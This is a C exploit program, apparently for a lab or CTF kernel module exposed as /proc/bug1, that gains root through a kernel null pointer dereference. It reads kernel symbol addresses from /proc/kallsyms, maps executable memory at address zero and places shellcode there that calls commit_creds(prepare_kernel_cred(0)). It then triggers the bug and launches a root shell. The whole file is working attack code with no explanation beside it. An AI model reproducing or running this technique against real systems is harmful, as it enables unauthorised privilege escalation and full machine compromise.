#include <errno.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

struct cred;
struct task_struct;

typedef struct cred *(*prepare_kernel_cred_t) (struct task_struct *daemon) __attribute__((regparm(3)));
typedef int (*commit_creds_t) (struct cred *new) __attribute__((regparm(3)));

prepare_kernel_cred_t   prepare_kernel_cred;
commit_creds_t    commit_creds;

void touch_null_kp() {
    int fd = open("/proc/bug1", O_WRONLY);
    write(fd, "fanrong", 7); // trigger null pointer dereference
}

void get_shell() {
  char *argv[] = {"/bin/sh", NULL};

  if (getuid() == 0){
    printf("\e[36m[+] Root shell success !! :)\n");
    execve("/bin/sh", argv, NULL);
  }
  printf("\e[31m[-] failed to get root shell :(\n");
}

/* use for privilige escalation */
void get_root() {
    commit_creds(prepare_kernel_cred(0));
}

/* get function address by reading /proc/kallsyms */
unsigned long get_kernel_sym(char *name)
{
  FILE *f;
  unsigned long addr;
  char dummy;
  char sname[256];
  int ret = 0;

  //f = fopen("System.map", "r");
  f = fopen("/proc/kallsyms", "r");
  if (f == NULL) {
    printf("\e[31m[-] Failed to open /proc/kallsyms\n");
    exit(-1);
  }
  printf("\e[36m[+] Find %s...\n", name);
  while(ret != EOF) {
    ret = fscanf(f, "%p %c %s\n", (void **)&addr, &dummy, sname);
    if (ret == 0) {
      fscanf(f, "%s\n", sname);
      continue;
    }
    if (!strcmp(name, sname)) {
      fclose(f);
			if(addr == 0) {
	      printf("\e[31m[-] User not able to get kallsyms for %s at %lx\n", name, addr);
    		exit(-1);
			}
			else
	      printf("\e[32m[+] Found %s at %lx\n", name, addr);
      return addr;
    }
  }
  fclose(f);
  return 0;
}

int main(int argc, char **argv)
{
  /* get function address */
  prepare_kernel_cred = (prepare_kernel_cred_t)get_kernel_sym("prepare_kernel_cred");
  commit_creds = (commit_creds_t)get_kernel_sym("commit_creds");
  printf("\e[32mGot commit_creds:%p,prepare_kernel_cred%p\n", commit_creds, prepare_kernel_cred);

  /* allocate memory loacate in 0x00 */
  printf("\e[36m[+] Try to allocat 0x00000000...\n");
  if (mmap(0, 4096, PROT_READ|PROT_WRITE|PROT_EXEC,MAP_ANON|MAP_PRIVATE|MAP_FIXED, -1, 0) == (char *)-1){
    printf("\e[31m[-] Failed to allocat 0x00000000\n");
    return -1;
  }
  printf("\e[32m[+] Allocation success !\n");

  /* memset(0, 0xcc, 4096); */
  /*
    //movq rax, 0xffffffff81f3f45a
    //movq [rax], 0
    // it is not nessecc
    mov rax, 0x4242424242424242 // 48 b8 42 42 42 42 42 42 42 42
    call rax // ff d0
    xor rax, rax // 48 31 c0
    ret // c3
    replace 0x4242424242424242 by get_root
    https://defuse.ca/online-x86-assembler.htm#disassembly
     */
	printf("\e[36m[+] Put shellcode\n");
  unsigned char shellcode[] = {
		/*0x48, 0xC7, 0xC0, 0x5A, 0xF4, 0xF3, 0x81, *//*0x48, 0xC7, 0x00, 0x00, 0x00, 0x00, 0x00,*/
		0x48, 0xB8, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0xFF, 0xD0, 0x48, 0x31, 0xC0, 0xC3
	};
  /* insert the getroot address to shellcode */
  //void **get_root_offset = rawmemchr(shellcode, 0x42); // using rawmemchr gives unexpected address
  void **get_root_offset = memchr(shellcode, 0x42, sizeof(shellcode));
  (*get_root_offset) = get_root;
  /* map shellcode to 0x00 */
  memcpy(0, shellcode, sizeof(shellcode));

  /* jmp to 0x00 */
	printf("\e[36m[+] Triggering null pointer dereference\n");
  touch_null_kp();

  get_shell();
	printf("\e[0m\n");

}
